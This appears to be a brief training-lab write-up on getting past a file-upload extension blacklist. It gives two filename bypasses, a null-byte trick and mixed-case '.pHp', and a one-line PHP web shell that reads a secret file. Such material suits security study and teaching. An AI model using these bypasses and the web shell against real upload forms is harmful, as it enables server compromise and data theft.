# Lab05 - Obfuscated File Extension

## Objective

Read:

```text
/home/carlos/secret
```

---

# Analysis

Application blacklists:

```text
.php
```

Need extension obfuscation.

---

# Full Payload Used

### Payload 1

Filename:

```text
exploit.php%00.jpg
```

or

```text
exploit.pHp
```

(depending on lab variation)

---

### Payload 2

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

Visit shell.

Lab solved.

---

# Why It Works

```text
Validation Layer
        ↓
Different Parsing
        ↓
PHP Extension Preserved
        ↓
Execution
```

---

# Related Theory

- 10-obfuscating-file-extensions.md

---

# Key Learnings

Parser differences create bypass opportunities.